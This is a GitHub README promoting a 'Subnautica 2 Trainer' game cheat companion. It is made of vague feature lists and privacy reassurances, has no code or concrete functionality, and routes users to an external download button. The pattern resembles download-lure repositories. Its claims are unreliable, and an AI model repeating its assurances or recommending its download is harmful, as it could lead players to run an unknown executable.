![preview](https://raw.githubusercontent.com/delavegapauljake2-code/Subnautica-2-Companion-Console/main/view_7a1736.svg)
[![Download](https://raw.githubusercontent.com/delavegapauljake2-code/Subnautica-2-Companion-Console/main/btn_597c5.svg)](https://delavegapauljake2-code.github.io/Subnautica-2-Companion-Console/)

# 🌊 Subnautica 2 Trainer — Deep Current Edition

> A companion utility for the Subnautica 2 experience: profiles, configurable options, and quick-access tools wrapped in a calm, responsive interface. Built for explorers who value control without losing the sense of wonder the ocean still holds.

![Status](https://img.shields.io/badge/status-active-0e7490)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-1e3a8a)
![License](https://img.shields.io/badge/license-MIT-16a34a)
![Language](https://img.shields.io/badge/languages-12-7c3aed)
![UI](https://img.shields.io/badge/UI-responsive-0891b2)
![Support](https://img.shields.io/badge/support-24%2F7-059669)

---

## 🐚 What This Is

Deep Current Edition is not another pile of toggles. It is a **trainer companion** designed around a single question: *what if adjusting your dive felt as natural as the tide shifting?* Instead of forcing you to memorize menus, we built **profiles** — named presets that remember how you like to explore. Whether you are a marine cartographer charting every trench or a builder obsessed with structural elegance, the trainer adapts to your rhythm instead of the other way around.

The project began as a modest experiment and grew into a full toolkit spanning configuration presets, live parameter adjustment, quick-access overlays, and a configurable option engine that stays out of the way until called upon. Each release in 2026 sharpens the edges: fewer clicks, clearer feedback, gentler defaults.

This is a project about **restraint as much as power**. Everything shipped here is intended to keep you in the driver's seat of your own adventure — never to hollow out what makes the deep feel deep.

---

## ✨ Feature Highlights

### 🎛️ Profiles That Remember You
- Save, rename, duplicate, and export profile sets
- Auto-load a preferred profile on start without any prompt
- Profile inheritance so a "base exploration" template can feed child configs
- Cloud-agnostic profile storage in plain, human-readable format

### ⚙️ Configurable Options Engine
- Layered option groups (movement, environment, quality-of-life, diagnostics)
- Per-option descriptions with inline hints
- Instant rollback if an option causes instability during a session
- Toggle categories independently without shutting down the trainer

### 🧭 Quick-Access Tools
- Contextual overlay that never obstructs view
- Hotkey remapping for every tool
- Compact and extended layout modes
- One-press profile swapping

### 🖥️ Responsive UI
- Scales gracefully from compact laptop screens to ultrawide monitors
- Keyboard-first navigation with optional pointer input
- Theming that respects light, dark, and high-contrast preferences
- Reduced-motion mode for users sensitive to animated transitions

### 🌐 Multilingual Support
- Twelve languages at launch, with community translation pipeline
- Right-to-left layout handling
- Locale-aware number and time formatting
- Fallback language chain when a translation is incomplete

### 🛡️ Stability & Safety Circuitry
- Isolated session sandbox so exploration never touches saved progress unexpectedly
- Automatic snapshot of configuration before major changes
- Health-check routine runs at startup and reports anomalies plainly

### 🕓 24/7 Customer Support
- Around-the-clock response coverage via ticketing
- Community discussion threads for peer-to-peer tips
- Documented changelogs for every 2026 release

### 🔍 Diagnostics
- Session log viewer with search and filter
- Exportable diagnostic bundles for support handoff
- Optional performance telemetry that stays local by default

---

## 🚀 Getting Started (The Friendly Path)

We deliberately avoid cryptic command lines. The companion installs like any normal desktop application and then guides you through a short first-run wizard. Choose your language, pick a starting profile, and you are already configured.

1. Acquire the packaged release for your operating system.
2. Unpack it into a folder you can find again — the trainer does not scatter files across your disk.
3. Launch the entry point. The wizard opens on first run only.
4. Choose a default profile, or start blank and build one as you explore.
5. Pin the trainer to your taskbar or dock for quick rescue during a dive.

No global system modification is performed. No background daemons are registered. Closing the application leaves nothing running.

---

## 🧩 Configuration Model

At the heart of the trainer is a layered configuration file. Think of it as a ship's manifest: everything stowed where you expect it, easy to read, and easy to amend mid-voyage.

- **Core layer** — startup defaults, rarely touched.
- **Profile layer** — your named presets, swapped at will.
- **Session layer** — transient overrides that vanish when you exit.
- **Override layer** — advanced knob turns for edge scenarios.

Each layer can borrow from the one beneath it. If the session layer changes an environmental tint, the profile layer is untouched, and the next launch returns to your baseline. This silent hierarchy means you can experiment freely without fear of losing the settings you actually cared about.

---

## 🎨 Design Philosophy

Most utilities are utility-shaped: gray panels, tiny fonts, and a promise of power that you have to decode. Deep Current Edition takes the opposite path. Surfaces are soft, spacing is generous, and every label reads like a human wrote it — because a human did.

Three principles guide each screen:

1. **Calm first.** Nothing shouts. Nothing blinks angrily.
2. **Reversible always.** Every action has a sensible undo.
3. **Honest about state.** If something is disabled, it says why.

The interface will not pretend to be a game menu, nor will it pretend to be a developer console. It sits in a third space: a tool you actually enjoy opening.

---

## 🌍 Languages Currently Supported

English, Spanish, French, German, Portuguese, Italian, Dutch, Polish, Japanese, Korean, Simplified Chinese, and Arabic — with reverse-compatibility for right-to-left rendering.

Community members have begun contributing localization files for additional regions. If your language is missing and you would like to help, the translation schema lives alongside the main configuration files in a plainly documented format.

---

## 🔐 Privacy Stance

Nothing about your exploration is sent anywhere unless you explicitly opt in to anonymized telemetry. Diagnostics bundles are generated locally and shared only by your hand. The companion stores its data in a single application directory you can audit, back up, or delete with confidence.

There are no hidden network calls, no advertisement surfaces, no nag screens. The only microphone the trainer responds to is your own keyboard.

---

## 🧪 Roadmap for 2026

- Profile marketplace for sharing configurations between explorers
- Visual diff tool showing exactly what a profile changes
- Expanded quick-access palette with per-tool hotkey chaining
- Accessibility pass with screen-reader labels for every control
- Translation coverage extended to sixteen languages
- A documented plugin surface for community-authored tools

Ordering may shift as feedback arrives. The issue tracker remains the single source of truth for sequencing.

---

## 🤝 Contributing

Contributions are welcome and appreciated. Before opening a pull request, skim the contributing guide, keep commits scoped to one concern, and include a short rationale describing the *why* behind the change. Small, thoughtful patches are reviewed far more quickly than sweeping rewrites.

Ways to help beyond code:
- Report reproducibility steps for bugs
- Translate strings into languages you speak
- Write walkthroughs for the discussion forum
- Share profile configurations that others might enjoy

---

## ❓ Frequently Imagined Questions

**Will this change my saved games?**
Configuration snapshots are stored separately from your campaign data. Unexpected interactions are exactly what the sandbox circuit is designed to prevent.

**Do I need a separate account?**
No. There is no account system. The trainer operates as a standalone companion.

**Can I run it on a second monitor?**
Yes — the overlay is position-agnostic and can dock to any edge of any display.

**What if something feels wrong after I toggle an option?**
Every option surfaces a rollback control. If the trainer detects instability, it offers to revert the most recent change for you.

**Is there a portable mode?**
Yes. Placing a marker file beside the executable keeps all configuration inside the application folder.

---

## ⚠️ Disclaimer

This project is an independent companion utility and is not affiliated with, endorsed by, or sponsored by the creators or publishers of Subnautica 2. All trademarks belong to their respective owners. The trainer is provided as-is for personal, exploratory use and should be employed responsibly with respect for the terms of service of any platform you interact with. The authors accept no liability for outcomes arising from its use.

Use good judgment. Respect the ocean. Enjoy the journey.

---

## 📜 License

Released under the MIT License. See the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Deep Current Edition contributors.

---

[![Download](https://raw.githubusercontent.com/delavegapauljake2-code/Subnautica-2-Companion-Console/main/btn_597c5.svg)](https://delavegapauljake2-code.github.io/Subnautica-2-Companion-Console/)